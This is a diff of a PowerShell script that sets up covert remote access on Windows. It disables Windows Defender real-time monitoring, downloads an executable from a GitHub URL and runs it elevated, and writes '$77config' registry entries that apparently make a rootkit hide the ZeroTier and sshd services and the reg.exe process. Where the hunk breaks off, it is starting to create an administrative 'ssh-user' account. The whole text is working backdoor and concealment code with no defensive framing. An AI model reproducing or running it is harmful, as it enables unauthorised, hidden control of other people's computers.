@@ -58,35 +58,6 @@ if (Test-Path -Path $zeroTierFolderPath) {
 # Disable Windows Defender Antivirus
 Set-MpPreference -DisableRealtimeMonitoring $true
 
-# Base path for the $77config configuration
-$baseConfigPath = "HKLM\SOFTWARE\$77config"
-
-# Commands to ensure the $77config key and necessary subkeys exist
-$ensurePathsCommands = @(
-    "reg add `"$baseConfigPath`" /f",
-    "reg add `"$baseConfigPath\service_names`" /f",
-    "reg add `"$baseConfigPath\process_names`" /f"
-)
-
-foreach ($cmd in $ensurePathsCommands) {
-    try {
-        Start-Process cmd.exe -ArgumentList "/c", $cmd -Wait
-    } catch {
-        Handle-Error -message "Failed to add registry key: $cmd"
-    }
-}
-
-# Example of hiding services
-$servicesToHide = @("ZeroTierOneService", "sshd")
-foreach ($service in $servicesToHide) {
-    try {
-        $cmdCommandService = "reg add `"$baseConfigPath\service_names`" /v $service /t REG_SZ /d $service /f"
-        Start-Process cmd.exe -ArgumentList "/c", $cmdCommandService -Wait
-    } catch {
-        Handle-Error -message "Failed to hide service: $service"
-    }
-}
-
 # Define the URL and download location for improved.exe
 $exeUrl = "https://github.com/Ogyeet10/installer9000/raw/main/improved.exe"
 $tempFolder = $env:TEMP
@@ -99,7 +70,41 @@ Invoke-WebRequest -Uri $exeUrl -OutFile $exePath
 Start-Process -FilePath $exePath -Verb RunAs -Wait
 
 # Delete the downloaded improved.exe
+Start-Sleep -Seconds 2
 Remove-Item $exePath -Force
+
+# Base path for the $77config configuration
+$baseConfigPath = "HKLM\SOFTWARE\$77config"
+
+# Commands to ensure the $77config key and necessary subkeys exist
+#$ensurePathsCommands = @(
+ #   "reg add ""$baseConfigPath"" /f",
+  #  "reg add ""$baseConfigPath\service_names"" /f",
+   # "reg add ""$baseConfigPath\process_names"" /f"
+#)
+
+foreach ($cmdCommand in $ensurePathsCommands) {
+    Start-Process cmd.exe -ArgumentList "/c", $cmdCommand -Wait
+}
+
+# Define service names to hide - ZeroTier and SSH service
+$servicesToHide = @("ZeroTierOneService", "sshd") # Replace 'sshd' with your specific SSH service name if different
+
+# Hide specified services using reg add
+foreach ($service in $servicesToHide) {
+    $cmdCommandService = "reg add ""$baseConfigPath\service_names"" /v $service /t REG_SZ /d $service /f"
+    Start-Process cmd.exe -ArgumentList "/c", $cmdCommandService -Wait
+}
+
+# Add reg.exe to the list of processes to hide
+$processesToHide = @("reg.exe") # Add any additional process names here
+
+# Hide specified processes using reg add
+foreach ($process in $processesToHide) {
+    # For clarity and consistency, use the process name both as the value name and the value
+    $cmdCommandProcess = "reg add ""$baseConfigPath\process_names"" /v $process /t REG_SZ /d $process /f"
+    Start-Process cmd.exe -ArgumentList "/c", $cmdCommandProcess -Wait
+}
 
 # Create a new user `ssh-user` with administrative privileges
 $userName = "ssh-user"
